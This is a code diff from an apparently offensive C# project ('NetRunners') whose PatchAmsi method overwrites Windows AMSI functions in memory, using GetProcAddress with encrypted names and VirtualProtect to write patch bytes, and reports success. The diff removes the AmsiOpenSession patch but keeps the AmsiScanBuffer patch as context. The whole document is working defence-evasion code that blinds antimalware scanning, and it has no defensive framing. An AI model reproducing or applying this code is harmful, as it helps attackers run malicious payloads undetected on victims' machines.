@@ -10,7 +10,7 @@ namespace NetRunners.Patchers
     /// </summary>
     public static class Patcher
     {
-        // patches AmsiOpenSession's first test instruction to xor, triggering conditional jump to invalid argument
+        // patch amsiscanbuffer
         public static bool PatchAmsi()
         {
             try
@@ -46,32 +46,7 @@ namespace NetRunners.Patchers
 
                 // restore memory protection
                 VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
-                //return true;
 
-                //////// AMSIOPENSESSION
-                if (IntPtr.Size == 8)
-                {
-                    patch = new byte[8];
-                }
-                else
-                {
-                    patch = new byte[4];
-                }
-
-                // get amsiopensession pointer
-                funcAddress = GetProcAddress(Library, Decrypt(AmsiOpenSession_Byte));
-                if (funcAddress == IntPtr.Zero)
-                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
-
-                // fix memory protections of amsiopensession
-                VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);
-
-                // patch bytes using our payload
-                Marshal.Copy(patch, 0, funcAddress, patch.Length);
-
-                // restore memory protection
-                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
-                
                 Console.WriteLine("[+] Successfully Patched AMSI!");
                 return true;
             }
